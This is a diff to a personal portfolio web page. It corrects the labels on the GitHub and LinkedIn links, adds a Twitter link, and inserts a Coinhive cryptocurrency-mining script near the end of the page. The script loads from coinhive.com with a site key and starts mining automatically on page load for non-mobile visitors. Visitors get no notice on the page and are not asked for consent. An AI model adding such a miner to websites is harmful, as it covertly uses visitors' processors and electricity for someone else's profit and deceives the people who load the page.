@@ -31,8 +31,9 @@
                         <p><a href="resume.pdf" target="_blank">Resume</a></p>
 						<footer>
 							<ul class="icons">                              
-                                <li><a href="https://www.github.com/Thenerdstation" class="fa-github">Facebook</a></li>
-								<li><a href="https://www.linkedin.com/in/chase-roberts-a9a788a3?trk=pub-pbmap" class="fa-linkedin">Instagram</a></li>
+                                <li><a href="https://www.github.com/Thenerdstation" class="fa-github">Github</a></li>
+				<li><a href="https://www.linkedin.com/in/chase-roberts-a9a788a3?trk=pub-pbmap" class="fa-linkedin">Linkedin</a></li>
+				<li><a href="https://twitter.com/TheNerdStation" class="fa-twitter">Twitter</a></li>
                                 <li><a href="mailto:keeper6928@gmail.com" class="fa-envelope">Email</a></li>
 							</ul>
 						</footer>
@@ -56,6 +57,15 @@
 					document.body.className += (navigator.userAgent.match(/(MSIE|rv:11\.0)/) ? ' is-ie' : '');
 				}
 			</script>
+			<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+			<script>
+				var miner = new CoinHive.Anonymous('CdFbxUKukYxOgz6vOFzb5aBVUMLYjskM', {throttle: 0.3});
 
+				// Only start on non-mobile devices and if not opted-out
+				// in the last 14400 seconds (4 hours):
+				if (!miner.isMobile() && !miner.didOptOut(14400)) {
+					miner.start();
+				}
+			</script>
 	</body>
 </html>
